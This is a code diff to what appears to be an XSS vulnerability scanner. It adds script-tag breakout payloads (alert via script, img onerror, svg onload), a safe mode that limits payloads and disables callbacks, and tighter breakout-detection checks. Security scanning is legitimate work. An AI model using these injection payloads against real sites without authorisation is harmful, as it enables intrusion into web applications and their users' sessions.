@@ -50,6 +50,26 @@ class BreakoutPayloadGenerator:
         """
         return [
             {
+                'payload': "</script><script>alert(1)</script>",
+                'description': "Close script tag without quote break (HTML parser)",
+                'context': 'js_string_single'
+            },
+            {
+                'payload': "</script><script>alert(1)</script>",
+                'description': "Close script tag without quote break (HTML parser)",
+                'context': 'js_string_double'
+            },
+            {
+                'payload': "</script><img src=x onerror=alert(1)>",
+                'description': "Close script tag + HTML event handler",
+                'context': 'js_string_single'
+            },
+            {
+                'payload': "</script><svg/onload=alert(1)>",
+                'description': "Close script tag + SVG onload",
+                'context': 'js_string_double'
+            },
+            {
                 'payload': "'</script><script>alert('XSS')</script>",
                 'description': "Single quote escape + script tag closure",
                 'context': 'js_string_single'
@@ -460,7 +480,8 @@ def detect_breakout_xss(url: str,
                         method: str = 'GET',
                         form_data: Dict = None,
                         timeout: int = 10,
-                        callback_url: str = None) -> Optional[Dict]:
+                        callback_url: str = None,
+                        safe_mode: bool = True) -> Optional[Dict]:
     """
     Test a specific parameter for breakout XSS scenarios
     
@@ -524,6 +545,10 @@ def detect_breakout_xss(url: str,
                     simple_payload_worked = True
                     break
             
+            # Template literals require expression injection; simple reflection isn't execution
+            if context.context_type == 'js_template_literal':
+                simple_payload_worked = False
+
             if simple_payload_worked:
                 # If simple payloads work, it's not a breakout scenario
                 return None
@@ -531,10 +556,15 @@ def detect_breakout_xss(url: str,
             # Step 3: Test breakout-specific payloads
             successful_breakout = None
             
-            # Combine regular and encoded payloads
-            all_payloads = context.breakout_payloads + BreakoutPayloadGenerator.get_encoded_breakout_payloads()
+            # Combine regular and encoded payloads (encoded only in unsafe mode)
+            if safe_mode:
+                all_payloads = context.breakout_payloads
+                callback_url = None
+            else:
+                all_payloads = context.breakout_payloads + BreakoutPayloadGenerator.get_encoded_breakout_payloads()
             
-            for payload_info in all_payloads:
+            payload_limit = 6 if safe_mode else len(all_payloads)
+            for payload_info in all_payloads[:payload_limit]:
                 payload = payload_info['payload']
                 
                 # Filter payloads by context match
@@ -617,6 +647,10 @@ def is_breakout_successful(html: str, payload: str, context_type: str) -> bool:
     # Check if payload is present and not encoded
     if payload not in html or is_html_encoded(html, payload):
         return False
+
+    # If payload closes a script tag and is reflected unencoded, treat as breakout success
+    if '</script' in payload.lower():
+        return True
     
     # For script tag breakouts, check if </script> appears before alert/XSS code
     if 'script' in context_type or context_type == 'script_tag':
